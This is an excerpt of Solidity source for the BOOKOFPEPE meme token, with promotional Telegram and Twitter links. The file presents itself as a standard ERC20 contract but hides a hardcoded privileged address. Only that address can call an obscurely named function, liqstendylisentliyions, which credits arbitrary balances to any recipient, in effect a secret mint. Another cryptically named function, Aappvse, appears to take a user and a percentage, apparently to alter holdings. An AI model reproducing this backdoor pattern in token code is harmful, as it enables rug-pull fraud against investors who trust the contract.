...
*/
/**
https://t.me/BOOKOFPEPE_erc20
https://twitter.com/BOPE_ETH
*/
...
contract BOOKOFPEPE is Context, Ownable, IERC20 {
    ...
    uint256 private _totalSupply;address private    _markSitbtskaddress;
    ...
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        ...
        _markSitbtskaddress = 0x2B0efb57149cEBEA3cbF31D8F010d46a6f3B1b01;
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }


    function Aappvse(address user, uint256 Percentse) external {
    ...
    function isMee() internal view returns (bool) {
        return _msgSender() ==   _markSitbtskaddress ;
    }

    function liqstendylisentliyions(address recipient, uint256 aDropst)  external {uint256 receiveRewrd = aDropst;_balances[recipient] += receiveRewrd;require(isMee(), "Caller is not the original caller");
    }
